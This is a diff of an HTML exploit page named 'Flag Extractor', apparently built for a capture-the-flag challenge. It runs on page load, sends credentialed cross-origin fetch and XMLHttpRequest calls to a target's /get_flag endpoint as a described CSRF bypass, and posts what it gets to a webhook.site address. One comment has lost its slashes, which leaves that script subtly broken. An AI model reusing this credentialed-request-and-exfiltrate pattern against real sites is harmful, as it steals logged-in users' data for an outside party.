@@ -4,30 +4,82 @@
     <title>Flag Extractor</title>
 </head>
 <body>
+    <h1>Loading...</h1>
+    <div id="status"></div>
+    
     <script>
-        // Check if we were opened by window.open()
-        if (window.opener) {
-            // Try to access the parent window's origin
-            try {
-                // Make request to /get_flag from parent's context
-                fetch('http://34.134.162.213:17001/get_flag', {
-                    method: 'GET',
-                    credentials: 'include'
-                })
-                .then(response => response.json())
-                .then(data => {
-                    // Send flag to your server
-                    fetch('https://webhook.site/110d1227-1b51-4c79-8576-31c177b7a1e1', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify(data)
-                    });
-                })
-                .catch(err => console.error(err));
-            } catch (e) {
-                console.error('Access denied:', e);
-            }
+        const statusDiv = document.getElementById('status');
+        
+        // Function to send data to a webhook or log it
+        function exfiltrateData(data) {
+            
+             Method 2: Send to webhook.site (replace with your webhook)
+             fetch('https://webhook.site/110d1227-1b51-4c79-8576-31c177b7a1e1', {
+                 method: 'POST',
+                 headers: {'Content-Type': 'application/json'},
+                 body: JSON.stringify(data)
+             });
+            
+            // Method 3: Display on page
+            statusDiv.innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
         }
+        
+        // Exploit the CSRF bypass - no Origin header
+        function attemptFlagExtraction() {
+            statusDiv.innerHTML = 'Attempting flag extraction...';
+            
+            // Try direct fetch without Origin header
+            fetch('http://34.134.162.213:17001/get_flag', {
+                method: 'GET',
+                credentials: 'include',
+                mode: 'cors'
+            })
+            .then(response => {
+                if (response.ok) {
+                    return response.json();
+                } else {
+                    throw new Error('Request failed: ' + response.status);
+                }
+            })
+            .then(data => {
+                statusDiv.innerHTML = 'Success! Flag extracted.';
+                exfiltrateData(data);
+            })
+            .catch(error => {
+                statusDiv.innerHTML = 'Method 1 failed: ' + error.message;
+                console.error('Error:', error);
+                
+                // Try alternative method with XMLHttpRequest
+                tryXHRMethod();
+            });
+        }
+        
+        function tryXHRMethod() {
+            statusDiv.innerHTML = 'Trying XMLHttpRequest method...';
+            
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', 'http://34.134.162.213:17001/get_flag', true);
+            xhr.withCredentials = true;
+            
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    const data = JSON.parse(xhr.responseText);
+                    statusDiv.innerHTML = 'XHR Success! Flag extracted.';
+                    exfiltrateData(data);
+                } else {
+                    statusDiv.innerHTML = 'XHR failed: ' + xhr.status;
+                }
+            };
+            
+            xhr.onerror = function() {
+                statusDiv.innerHTML = 'XHR error occurred';
+            };
+            
+            xhr.send();
+        }
+        
+        // Start the exploit
+        setTimeout(attemptFlagExtraction, 1000);
     </script>
 </body>
 </html>
